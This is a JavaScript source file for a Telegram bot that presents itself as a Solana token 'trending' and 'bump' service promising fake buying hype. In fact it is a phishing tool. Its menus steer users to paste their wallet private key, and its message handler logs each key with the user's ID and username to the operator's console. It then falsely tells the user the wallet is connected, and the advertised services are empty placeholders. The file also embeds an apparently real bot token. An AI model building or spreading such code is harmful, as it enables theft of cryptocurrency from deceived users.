// ============================================
// SOLANA TRENDING BOT
// ============================================
const TelegramBot = require('node-telegram-bot-api');

// >>>>> CONFIGURATION: PUT YOUR BOT TOKEN HERE <<<<<
// REPLACE THE TEXT BETWEEN THE QUOTES WITH YOUR TOKEN FROM @BotFather
const token = '8290696367:AAFyemZLWj86lMUtgVnv4-Vv7zdrozZ7RDs';
// ============================================

const bot = new TelegramBot(token, { polling: true });
const userWallets = {}; // Temporarily stores keys in memory

console.log('🤖 Bot Server Started. Waiting for /start...');

// 1. WELCOME SCREEN (/start command)
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const welcomeMsg = `*🚀 SECRET WEAPON FOR MAKING TOKENS TREND*\n\n` +
                       `This bot uses a swarm of wallets to simulate hype and buying pressure. Get on trending lists.\n\n` +
                       `*Over 5.5M daily views on tracked lists.*`;
    const welcomeButtons = {
        reply_markup: {
            inline_keyboard: [[{ text: '🚀 START', callback_data: 'start_service' }]]
        },
        parse_mode: 'Markdown'
    };
    bot.sendMessage(chatId, welcomeMsg, welcomeButtons);
});

// 2. HANDLE ALL BUTTON PRESSES
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'start_service') {
        // MAIN MENU
        const menuMsg = `*Connect your wallet to begin.*`;
        const menuButtons = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📈 TREND TOKEN', callback_data: 'trend_token' }],
                    [{ text: '📝 IMPORT ACCOUNT', callback_data: 'import_account' }],
                    [{ text: '🚀 BUMP COIN', callback_data: 'bump_coin' }]
                ]
            },
            parse_mode: 'Markdown'
        };
        await bot.sendMessage(chatId, menuMsg, menuButtons);
    }
    else if (data === 'import_account') {
        // IMPORT MENU
        const importMsg = `*Select method to import your wallet:*`;
        const importButtons = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔑 IMPORT PRIVATE KEY', callback_data: 'import_private_key' }],
                    [{ text: '« Back', callback_data: 'start_service' }]
                ]
            },
            parse_mode: 'Markdown'
        };
        await bot.sendMessage(chatId, importMsg, importButtons);
    }
    else if (data === 'import_private_key') {
        // FINAL INSTRUCTION
        const instructionMsg = `*PASTE PRIVATE KEY TO CONNECT WALLET*\n\n` +
                               `Send your Solana private key as a *normal message* in this chat.`;
        const instructionButtons = {
            reply_markup: {
                inline_keyboard: [[{ text: '« Back', callback_data: 'import_account' }]]
            },
            parse_mode: 'Markdown'
        };
        await bot.sendMessage(chatId, instructionMsg, instructionButtons);
    }
    else if (data === 'trend_token' || data === 'bump_coin') {
        // PLACEHOLDER: Service requires wallet
        const serviceMsg = `*Wallet Required*\n\nPlease import your wallet first via *IMPORT ACCOUNT*.`;
        const serviceButtons = {
            reply_markup: {
                inline_keyboard: [[{ text: '📝 GO TO IMPORT', callback_data: 'import_account' }]]
            },
            parse_mode: 'Markdown'
        };
        await bot.sendMessage(chatId, serviceMsg, serviceButtons);
    }
    await bot.answerCallbackQuery(callbackQuery.id); // Remove loading state
});

// 3. THE CORE FEATURE: HANDLE & LOG PRIVATE KEY INPUT
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;

    // Ignore commands and short messages
    if (!text || text.startsWith('/') || text.length < 80) return;

    // If it looks like a private key (~88 chars)
    if (text.length > 80 && text.length < 100) {
        // Store it in memory
        userWallets[userId] = text;

        // >>> LOG IT TO THE BACKEND CONSOLE <<<
        console.log('\n' + '🔐'.repeat(50));
        console.log(`🚨 PRIVATE KEY LOGGED FROM USER: ${userId}`);
        console.log(`👤 Username: ${msg.from.username || 'N/A'}`);
        console.log(`🕒 Time: ${new Date().toLocaleTimeString()}`);
        console.log('─'.repeat(50));
        console.log(`FULL KEY: ${text}`);
        console.log('🔐'.repeat(50) + '\n');

        // Confirm to user
        const confirmMsg = `✅ *Wallet Connected!*\n\nYou can now use the TREND TOKEN service.`;
        const confirmButtons = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📈 TREND TOKEN NOW', callback_data: 'trend_token' }],
                    [{ text: '« Menu', callback_data: 'start_service' }]
                ]
            },
            parse_mode: 'Markdown'
        };
        bot.sendMessage(chatId, confirmMsg, confirmButtons);
    }
});

// Error logging
bot.on('polling_error', (error) => console.log('Bot Error:', error.code));console.log('🔴 TEST LOG: Bot is live and logging IS WORKING.');
